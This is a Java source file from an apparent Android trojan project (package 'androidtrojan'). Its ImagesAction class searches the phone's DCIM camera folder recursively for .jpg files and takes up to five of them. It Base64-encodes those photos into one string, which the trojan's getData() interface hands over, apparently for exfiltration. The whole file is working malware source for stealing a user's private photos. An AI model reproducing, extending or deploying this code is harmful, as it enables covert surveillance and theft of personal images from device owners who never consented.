package il.ac.colman.androidtrojan.Actions;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Base64;

public class ImagesAction implements ATAction{
	
	
	private StringBuilder myString;

	public ImagesAction()
    {
    	//getting the images default path (add "/Camera/" if using emulator, without if not)
		String imagesPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
    	
		//getting the list of the image files
    	List<File> imagesfiles = getListFiles(new File(imagesPath));
    	
    	//getting the NUM byte array of the images
    	List<String> MatrixOfImagesInBytes = getStringArrayOfImages(imagesfiles, 5);  	
    	
    	//Concatenate the byte array after converting each of them into string
    	this.myString = ConcatenatedStrings(MatrixOfImagesInBytes);
    	
    	
	        	
    }
    
    private StringBuilder ConcatenatedStrings (List <String> myByteArray)
    {
    	//String s = new String();
    	
    	StringBuilder buffer = new StringBuilder ();
    	String delim = "";
    	for (String element: myByteArray)
    	{
    	    buffer.append(delim);
    	    buffer.append(delim);
    	    buffer.append(delim);
    	    delim = System.getProperty("line.separator");
    	    buffer.append (element.toString());
    	}
    	buffer.toString();
    	
    	return buffer;
    }
    
    private List<String> getStringArrayOfImages(List<File> myImagesFilesList, int numberOfImagesToExtract)
    {
    	
    	List<String> ArrayOfStrings = new ArrayList<String>();
    	    	
    	for (File imageFile : myImagesFilesList) {
    	
    	if (numberOfImagesToExtract==0) 
    		break;
    	else numberOfImagesToExtract--;
    		
    		Bitmap bm = BitmapFactory.decodeFile(imageFile.getPath());
        	ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        	bm.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        	byte temp [] = baos.toByteArray();
        	
        	String encodedImage = Base64.encodeToString(temp, Base64.DEFAULT);
        	
        	ArrayOfStrings.add(encodedImage);
      	}
  
    	return ArrayOfStrings;
    	
    }
    
    private List<File> getListFiles(File parentDir) {
	       ArrayList<File> inFiles = new ArrayList<File>();
	       File[] files = parentDir.listFiles();
	       for (File file : files) {
	           if (file.isDirectory()) {
	               inFiles.addAll(getListFiles(file));
	           } else {
	               if(file.getName().endsWith(".jpg")){
	                   inFiles.add(file);
	               }
	           }
	       }
	       return inFiles; 
	    }

	@Override
	public String getData() {
		// TODO Auto-generated method stub
		return myString.toString();
	}
}